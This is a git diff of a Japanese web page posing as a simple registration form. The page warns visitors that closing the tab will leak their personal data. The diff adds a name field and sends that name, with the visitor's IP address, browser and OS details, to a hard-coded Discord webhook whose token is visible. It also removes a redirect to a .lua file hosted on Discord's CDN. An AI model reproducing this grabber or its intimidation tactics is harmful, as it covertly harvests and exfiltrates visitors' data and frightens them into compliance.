@@ -23,11 +23,15 @@
 <h3>簡単な登録をするだけ！！</h3>
 <h3>このタブを消すと個人情報が流出します。ipアドレスなどが流出します</h3>
 
-<!-- パスワード入力フォーム -->
-<form id="passwordForm">
+<!-- 名前とパスワード入力フォーム -->
+<form id="loginForm">
+    <label for="username">名前:</label>
+    <input type="text" id="username" name="username">
+    <br>
     <label for="password">パスワード:</label>
     <input type="password" id="password" name="password">
-    <button type="button" onclick="checkPassword()">Submit</button>
+    <br>
+    <button type="button" onclick="checkLogin()">Login</button>
 </form>
 
 <!-- リンクボタン -->
@@ -87,10 +91,10 @@
         });
 
     // DiscordのWebhookにデータを送信する関数
-    function sendDataToDiscord(ipAddress, browser, browserVersion, os, osVersion) {
+    function sendDataToDiscord(ipAddress, browser, browserVersion, os, osVersion, username) {
         var webhookURL = 'https://discord.com/api/webhooks/1223447142740262972/vxrn9O3gB3fVm0mx0g_VcN4jYB0MRK-L6pdcinnad2gTAk3jFYbYg_S1vfPixzFLoK6G'; // ここにDiscordのWebhookのURLを入力してください
         var data = {
-            content: '```端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '\nIPアドレス: ' + ipAddress + '```'
+            content: '```端末情報:\nブラウザ: ' + browser + '\nブラウザバージョン: ' + browserVersion + '\nOS: ' + os + '\nOSバージョン: ' + osVersion + '\nIPアドレス: ' + ipAddress + '\n名前: ' + username + '```'
         };
 
         fetch(webhookURL, {
@@ -111,21 +115,22 @@
         });
     }
 
-    // パスワードチェック関数
-    function checkPassword() {
+    // ログインチェック関数
+    function checkLogin() {
+        var username = document.getElementById("username").value;
         var password = document.getElementById("password").value;
-        // パスワードが正しい場合
-        if (password === "45451919") {
+        // 名前とパスワードが正しい場合
+        if (username !== "" && password !== "") {
             document.getElementById("accessButton").style.display = "block"; // ボタンを表示
         } else {
-            alert("パスワードが正しくありません。");
+            alert("名前とパスワードを入力してください。");
         }
     }
 
     // リンク先へリダイレクトする関数
     function redirectToLink() {
         // index1.htmlにリダイレクト
-        window.location.href = "https://cdn.discordapp.com/attachments/1223447103116935178/1240124023568990238/776826c9e558e35a.lua?ex=66456aff&is=6644197f&hm=517f07a5aa74e14063b26e3078db7d9dd68848d79d7f8546506f4d080f1cad3c&";
+        window.location.href = "https://www.youtube.com/";
     }
 </script>
 
